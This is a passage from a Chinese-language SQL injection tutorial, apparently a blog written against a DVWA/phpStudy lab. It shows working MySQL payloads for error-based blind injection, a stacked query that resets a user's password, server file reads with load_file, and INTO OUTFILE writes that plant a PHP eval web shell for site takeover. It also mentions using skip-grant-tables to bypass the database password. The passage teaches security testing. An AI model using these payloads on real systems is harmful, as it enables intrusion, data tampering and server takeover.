&lt;p&gt;&lt;strong&gt;&lt;code&gt;b&lt;/code&gt;: 在模式末尾加上一个源字符串中不存在的字符&lt;code&gt;&#39;b&#39;&lt;/code&gt;，是为了确保正则表达式的匹配最终一定会失败。这会迫使正则引擎耗尽所有可能的回溯路径，从而将延迟时间最大化&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;repeat(str,times)&lt;/code&gt;：字符串&lt;code&gt;str&lt;/code&gt;复制&lt;code&gt;times&lt;/code&gt;次&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;*我在dvwa上使用上述的正则匹配方式无法得到延时结果，如果您知道为什么请留言&amp;gt;&amp;lt;&lt;/p&gt;
&lt;p&gt;参考文章：&lt;a class=&#34;link&#34; href=&#34;https://www.cdxy.me/?p=789&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;MySQL时间盲注五种延时方法
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;span style=&#34;color:red;font-size:20px&#34;&gt;&lt;strong&gt;时间盲注其余的操作顺序和布尔盲注相同，只是换了一种方式实现判断&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;报错盲注&#34;&gt;报错盲注
&lt;/h3&gt;&lt;p&gt;报错盲注的思想和时间盲注相同，都是利用if函数&lt;/p&gt;
&lt;p&gt;不同点在于，报错盲注不依赖页面是否延时判断，而是依赖页面是否报错判断&lt;/p&gt;
&lt;p&gt;sql中存在很多数学计算函数，我们也主要利用他们来实现报错&lt;/p&gt;
&lt;h4 id=&#34;exp&#34;&gt;exp()
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;exp(x)&lt;/code&gt;返回e的x次方，也就是e^x^&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当传递给&lt;code&gt;exp()&lt;/code&gt;的参数过大（在MySQL中约大于&lt;strong&gt;709&lt;/strong&gt;）时，会产生数值越界错误&lt;/p&gt;
&lt;p&gt;我们可以通过位运算符&lt;code&gt;~&lt;/code&gt;运算0获得一个巨大的整数：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100,exp(~0),1)#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们知道，&lt;code&gt;~0&lt;/code&gt;的结果是64位无符号整数的最大值，远大于709，因此&lt;code&gt;exp()&lt;/code&gt;函数执行时必定会溢出报错：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DOUBLE value is out of range in &amp;#39;exp(~(0))&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;你也可以选择手动输入一个很大的数字，比如exp(99999)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;同样的，我们也可以不用if函数，只要利用判断的返回值做运算即可：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and exp((ascii(substring(database(),1,1))=100)*99999)#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;如果&lt;code&gt;ascii(substring(database(),1,1))=100&lt;/code&gt;为&lt;mark&gt;真&lt;/mark&gt;，那么运算式为&lt;code&gt;exp(1*99999)&lt;/code&gt;，也就是&lt;code&gt;exp(99999)&lt;/code&gt;，就会报错&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;cot&#34;&gt;cot()
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;cot()&lt;/code&gt;是余切三角函数，而众所周知，&lt;code&gt;cot(0)&lt;/code&gt;是不存在的：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100,cot(0),1)#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;也可以不用if函数：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and cot((ascii(substring(database(),1,1))=100)=0)#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;如果&lt;code&gt;ascii(substring(database(),1,1))=100&lt;/code&gt;为&lt;mark&gt;真&lt;/mark&gt;，那么运算式为&lt;code&gt;cot(1=0)&lt;/code&gt;，也就是&lt;code&gt;cot(0)&lt;/code&gt;，就会报错&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;pow&#34;&gt;pow()
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;pow(a,b)&lt;/code&gt;函数用于求a^b^的值&lt;/strong&gt;，相信你已经知道怎么做了：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100,pow(99999,99999),1)#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不使用if函数：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and pow((ascii(substring(database(),1,1))=100)+1,99999)#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;如果&lt;code&gt;ascii(substring(database(),1,1))=100&lt;/code&gt;为&lt;mark&gt;真&lt;/mark&gt;，那么运算式就是&lt;code&gt;pow(1+1,99999)&lt;/code&gt;,也就是2^99999^，就会报错&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;4-堆叠注入&#34;&gt;#4 堆叠注入
&lt;/h2&gt;&lt;p&gt;有些应用服务执行sql使用的不是&lt;code&gt;mysqli_query()&lt;/code&gt;,而是&lt;code&gt;mysqli_multi_query()&lt;/code&gt;方法，可以做到执行多条sql语句&lt;/p&gt;
&lt;h3 id=&#34;普通多语句注入&#34;&gt;普通多语句注入
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;如果又恰好没有过滤&lt;code&gt;;&lt;/code&gt;，我们就能使用&lt;code&gt;;&lt;/code&gt;分割语句，利用sql语句进行各种操作：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,2;update users set password=123 where id=1--+
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样就篡改了密码&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;但能使用堆叠注入的场景一般都对语句做了过滤，尤其是select这样的核心查询语句，我们需要用别的来代替&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;show查询&#34;&gt;show查询
&lt;/h3&gt;&lt;h4 id=&#34;查询数据库名称&#34;&gt;查询数据库名称
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;show&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;databases&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;查询数据库中的所有表&#34;&gt;查询数据库中的所有表
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;show&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;tables&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; 数据库名;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;查看表的字段&#34;&gt;查看表的字段
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;show&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;columns&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; 表名;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或者：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;describe&lt;/span&gt; 表名;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或者：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;desc&lt;/span&gt; 表名;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;查看创建表的语句&#34;&gt;查看创建表的语句
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;show&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;create&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;table&lt;/span&gt; 表名;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;handler查询&#34;&gt;handler查询
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;handler是mysql特有的语句，他可以通过句柄来访问表&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;句柄相当于一个指针&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;打开句柄&#34;&gt;打开句柄
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;handler&lt;/span&gt; 表名 &lt;span style=&#34;color:#c678dd&#34;&gt;open&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;查看第一行数据&#34;&gt;查看第一行数据
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;handler&lt;/span&gt; 表名 &lt;span style=&#34;color:#c678dd&#34;&gt;read&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;first&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;查看下一行数据&#34;&gt;查看下一行数据
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;handler&lt;/span&gt; 表名 &lt;span style=&#34;color:#c678dd&#34;&gt;read&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;next&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果不适用first，直接使用next，效果等同于first&lt;/p&gt;
&lt;h4 id=&#34;查看某一行数据&#34;&gt;查看某一行数据
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;handler&lt;/span&gt; 表名 &lt;span style=&#34;color:#c678dd&#34;&gt;READ&lt;/span&gt; 字段名 &lt;span style=&#34;color:#c678dd&#34;&gt;KEY&lt;/span&gt; (字段值);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;关闭句柄&#34;&gt;关闭句柄
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;handler&lt;/span&gt; 表名 &lt;span style=&#34;color:#c678dd&#34;&gt;close&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5-文件读写注入&#34;&gt;#5 文件读写注入
&lt;/h2&gt;&lt;h3 id=&#34;前提&#34;&gt;前提
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;mysql数据库中的&lt;code&gt;secure_file_priv&lt;/code&gt;参数指定了数据库导入和导出的安全路径&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;该参数可以有三种类型：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;secure_file_priv=NULL&lt;/code&gt;&lt;/strong&gt;：禁止导入和导出&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;secure_file_priv=/&lt;/code&gt;&lt;/strong&gt;：只能在/目录下导入和导出&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;secure_file_priv=&amp;quot;&amp;quot;&lt;/code&gt;&lt;/strong&gt; ：不做限制&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;打开&lt;code&gt;mysql.ini&lt;/code&gt;文件，在[mysqld]下修改（如果找不到就添加进去，一般都有）如下：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;secure_file_priv&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250707200427206.png&#34; alt=&#34;image-20250707200427206&#34; style=&#34;zoom:50%;&#34; /&gt;
&lt;p&gt;&lt;strong&gt;重启服务，在命令行登录mysql数据库（找&lt;code&gt;mysql.exe&lt;/code&gt;,我的路径是&lt;code&gt;phpStudy\PHPTutorial\MySQL\bin&lt;/code&gt;）：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mysql -u root -p
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;如果不知道密码，就在&lt;code&gt;mysql.ini&lt;/code&gt;中添加&lt;code&gt;skip-grant-tables&lt;/code&gt;，跟上面命令放在一起就行，意思是不需要登录密码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;登录后搜索该参数：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;show&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;variables&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;like&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;%priv%&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250707201002609.png&#34; alt=&#34;image-20250707201002609&#34; style=&#34;zoom: 80%;&#34; /&gt;
&lt;p&gt;&lt;strong&gt;显示&lt;code&gt;secure_file_priv&lt;/code&gt;对应value值为空，说明不做限制了&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;文件读取&#34;&gt;文件读取
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;利用&lt;code&gt;load_file&lt;/code&gt;函数能做到对服务器文件的读取：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;load_file&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;D:\\1.txt&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;配合注入语句，我们可以做到读取任意文件（当然前提是页面会有输出）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,load_file(&amp;#39;D:/WWW/1.txt&amp;#39;) #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250707205449502.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250707205449502&#34;
	
	
&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;p&gt;这里使用的是&lt;code&gt;/&lt;/code&gt;，因为&lt;code&gt;\&lt;/code&gt;是转义字符，而&lt;code&gt;/&lt;/code&gt;在字符串里面没有任何含义&lt;/p&gt;
&lt;p&gt;也可以使用&lt;code&gt;\\&lt;/code&gt;，给&lt;code&gt;\&lt;/code&gt;转义，让它被当做普通字符处理&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;普通文件写入&#34;&gt;普通文件写入
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;利用&lt;code&gt;into outfile&lt;/code&gt;可以实现任意内容写入指定位置的文件：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;lt;? evilcode ?&amp;gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;into&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;outfile&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;D:\\1.txt&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;也可以使用&lt;code&gt;into dumpfile&lt;/code&gt;，区别是它只生成一行数据，不会对数据做任何处理（换行等）：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;lt;? evilcode ?&amp;gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;into&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;dumpfile&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;D:\\1.txt&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;利用这一点，我们可以向服务器上传一句话木马&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;union-select&#34;&gt;union select
&lt;/h4&gt;&lt;p&gt;最常用的写入方式，在select内容中插入一句话木马&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,&amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39; into outfile &amp;#39;D:/WWW/114514.php&amp;#39; #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250707205900643.png&#34; alt=&#34;image-20250707205900643&#34;  /&gt;
&lt;p&gt;虽然报错，但是文件也写入成功了：&lt;/p&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250707205828237.png&#34; alt=&#34;image-20250707205828237&#34;  /&gt;
&lt;p&gt;&lt;strong&gt;接着就可以使用蚁剑等工具接管网站&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;lines-terminated-by&#34;&gt;lines terminated by
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;lines terminated by&lt;/code&gt;用来定义导出的文件中每行数据以什么字符结尾（默认是换行符 &lt;code&gt;\n&lt;/code&gt;）：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; into outfile &amp;#39;D:/WWW/114514.php&amp;#39; lines terminated by &amp;#39;&amp;lt;?php eval($_POST[kaka]); ?&amp;gt;&amp;#39; #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708141833937.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250708141833937&#34;
	
	
